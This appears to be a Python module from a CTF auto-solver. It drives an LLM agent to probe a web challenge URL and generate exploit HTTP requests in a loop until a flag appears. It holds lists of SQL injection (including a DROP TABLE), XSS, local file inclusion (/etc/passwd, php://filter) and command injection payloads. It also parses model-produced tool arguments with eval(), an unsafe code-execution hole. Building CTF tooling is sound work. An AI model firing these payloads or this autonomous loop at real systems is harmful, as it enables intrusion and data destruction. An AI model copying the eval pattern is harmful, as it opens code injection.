"""
CTF-AutoSolver - Web 题型专用解题器
针对 Web 安全题目的专项解题逻辑
"""
import logging
from typing import Any, Optional

from app.core.llm import llm_router
from app.core.tools import tool_registry
from app.models.schemas import CTFChallenge, CTFSolution

logger = logging.getLogger(__name__)

WEB_SYSTEM_PROMPT = """You are a Web security CTF expert. Analyze the given web challenge and identify potential vulnerabilities.

Common Web CTF attack vectors:
- **SQL Injection**: Union-based, Blind (boolean/time-based), Error-based, Second-order
- **XSS**: Reflected, Stored, DOM-based
- **File Inclusion**: LFI (Local File Inclusion), RFI (Remote File Inclusion)
- **Command Injection**: OS command execution, code injection
- **SSRF**: Server-Side Request Forgery
- **Authentication Bypass**: IDOR, JWT manipulation, session fixation
- **File Upload**: Bypass restrictions, webshell upload
- **Deserialization**: PHP/Java/Python object injection
- **SSTI**: Server-Side Template Injection (Jinja2, Twig, etc.)

For each challenge:
1. Analyze the URL/description for potential entry points
2. Use http_request to probe the target
3. Identify the vulnerability type
4. Craft an appropriate exploit payload
5. Extract the flag

Provide your analysis and tool calls."""

# 常见 Web 攻击 payload 模板
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,flag FROM flags--",
    "1' AND 1=1--",
    "admin'--",
    "1; DROP TABLE users--",
    "' AND SLEEP(5)--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "{{7*7}}",
    "${7*7}",
]

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "php://filter/convert.base64-encode=index.php",
    "php://input",
]

COMMAND_INJECTION_PAYLOADS = [
    "; cat /flag",
    "| cat /flag",
    "`cat /flag`",
    "$(cat /flag)",
    "&& cat /flag",
]


class WebSolver:
    """Web 安全 CTF 解题器"""

    def __init__(self, provider: str = "openai"):
        self.provider = provider
        self.tools_used: list[str] = []
        self.steps: list[dict[str, Any]] = []

    async def analyze(self, challenge: CTFChallenge) -> dict[str, Any]:
        """
        分析 Web 题目，初步探测目标
        """
        if not challenge.url:
            return {"error": "Web challenge requires a target URL"}

        # Step 1: 基础 HTTP 探测
        logger.info(f"[WebSolver] Probing {challenge.url}")
        probe_result = await tool_registry.execute_tool("http_request", {
            "url": challenge.url,
            "method": "GET",
        })
        self.tools_used.append("http_request")
        self.steps.append({
            "step": "probe",
            "action": "GET request to target",
            "result": probe_result[:1000],
        })

        # Step 2: 让 LLM 分析探测结果并推荐攻击方向
        analysis = await llm_router.chat(
            messages=[
                {"role": "system", "content": WEB_SYSTEM_PROMPT},
                {"role": "user", "content": (
                    f"Challenge: {challenge.title}\n"
                    f"Description: {challenge.description}\n"
                    f"URL: {challenge.url}\n\n"
                    f"Initial probe result:\n{probe_result[:3000]}\n\n"
                    f"Analyze this web challenge. Identify:\n"
                    f"1. What technology/framework is being used\n"
                    f"2. What vulnerability type is most likely\n"
                    f"3. What specific attack to try first\n"
                    f"4. Provide the exact tool call to execute (http_request with appropriate params)"
                )},
            ],
            provider=self.provider,
            temperature=0.3,
        )

        self.steps.append({
            "step": "analysis",
            "content": analysis,
        })

        return {
            "probe_result": probe_result[:2000],
            "llm_analysis": analysis,
            "url": challenge.url,
        }

    async def auto_exploit(self, challenge: CTFChallenge, max_attempts: int = 5) -> CTFSolution:
        """
        自动化 Web 漏洞利用
        尝试常见攻击向量，结合 LLM 分析结果
        """
        analysis = await self.analyze(challenge)
        if "error" in analysis:
            return CTFSolution(
                challenge_id=challenge.id or "unknown",
                category=challenge.category,
                analysis=analysis["error"],
                strategy="N/A - no URL provided",
                flag=None,
                tools_used=[],
                steps=self.steps,
                confidence=0.0,
            )

        # 让 LLM 指导具体利用过程
        exploit_prompt = (
            f"Based on the analysis of the web challenge:\n"
            f"{analysis.get('llm_analysis', '')}\n\n"
            f"Now generate specific exploit payloads. For each attempt, provide:\n"
            f"- The vulnerability type being tested\n"
            f"- The exact http_request call parameters (url, method, headers, body)\n"
            f"- What you expect to find\n"
            f"Start with the most likely vulnerability based on your analysis."
        )

        flag = None
        for attempt in range(max_attempts):
            logger.info(f"[WebSolver] Exploit attempt {attempt + 1}/{max_attempts}")

            result = await llm_router.chat_with_tools(
                messages=[
                    {"role": "system", "content": WEB_SYSTEM_PROMPT},
                    {"role": "user", "content": exploit_prompt},
                ],
                tools=tool_registry.get_openai_tools_schema(),
                provider=self.provider,
                temperature=0.4,
            )

            tool_calls = result.get("tool_calls", [])
            reasoning = result.get("content", "")

            self.steps.append({
                "step": f"exploit_attempt_{attempt + 1}",
                "reasoning": reasoning[:500],
            })

            for tc in tool_calls:
                tool_name = tc["name"]
                tool_args = (
                    eval(tc["arguments"]) if isinstance(tc["arguments"], str)
                    else tc["arguments"]
                )
                self.tools_used.append(tool_name)

                observation = await tool_registry.execute_tool(tool_name, tool_args)
                self.steps.append({
                    "step": f"exploit_attempt_{attempt + 1}",
                    "tool": tool_name,
                    "arguments": str(tool_args)[:200],
                    "observation": observation[:1000],
                })

                # 检查 flag
                flag = self._extract_flag(observation)
                if flag:
                    break

                # 更新提示，让 LLM 根据结果调整策略
                exploit_prompt = (
                    f"Previous attempt result:\n"
                    f"Tool: {tool_name}\n"
                    f"Result: {observation[:2000]}\n\n"
                    f"{'Flag not found. Try a different approach.' if not flag else 'Flag found!'}\n"
                    f"If the current approach isn't working, try a different vulnerability type."
                )

            if flag:
                break

        return CTFSolution(
            challenge_id=challenge.id or "unknown",
            category=challenge.category,
            analysis=analysis.get("llm_analysis", ""),
            strategy=f"Web exploit: tried {len(self.steps)} steps",
            payload=self._extract_payload_from_steps(),
            flag=flag,
            tools_used=list(set(self.tools_used)),
            steps=self.steps,
            confidence=0.9 if flag else 0.3,
        )

    def _extract_flag(self, text: str) -> Optional[str]:
        import re
        patterns = [
            r"flag\{[^}]+\}",
            r"FLAG\{[^}]+\}",
            r"ctf\{[^}]+\}",
        ]
        for pattern in patterns:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                return match.group(0)
        return None

    def _extract_payload_from_steps(self) -> Optional[str]:
        for step in self.steps:
            if step.get("tool") == "http_request":
                args = step.get("arguments", "")
                if args:
                    return str(args)[:500]
        return None